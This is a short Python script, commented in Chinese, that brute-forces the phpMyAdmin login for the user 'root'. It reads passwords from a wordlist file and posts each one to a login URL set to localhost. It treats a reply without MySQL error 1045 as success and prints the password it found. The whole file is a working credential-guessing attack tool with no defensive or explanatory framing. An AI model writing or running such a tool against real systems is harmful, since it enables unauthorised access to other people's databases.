import urllib.request
import urllib.parse
import http.cookiejar
import sys
import re
#基本设置
name = "root"
url = "http://127.0.0.1:8030/index.php"
dict_name = "dict.txt"

#模拟登录
cookie = http.cookiejar.CookieJar()
cookieProc = urllib.request.HTTPCookieProcessor(cookie)
opener = urllib.request.build_opener(cookieProc)
urllib.request.install_opener(opener)

#正则
checker=re.compile(r"[\w\W]*1045[\w\W]*")

file = open(dict_name)
for i in file.readlines():
    i = i.strip()
    #print(i)
    try:
        data = urllib.parse.urlencode({'pma_username':name,
                                       'pma_password':i,
                                       'server':'1',
                                       'target':'index.php',
                                       'token':'ef91e30e05ac2ad0f587abce71c2a897'})
        data = data.encode('utf-8')
        req = urllib.request.Request(url, data)
        content = urllib.request.urlopen(req)
        text = content.read()
        #print(text)
        if checker.match(text.decode("utf-8"))==None:
            print("Successful")
            print("Password is : %s" % i)
            sys.exit()
        else:
            print("try %s failed" % i)
    except Exception:
        print("Unexpecct error")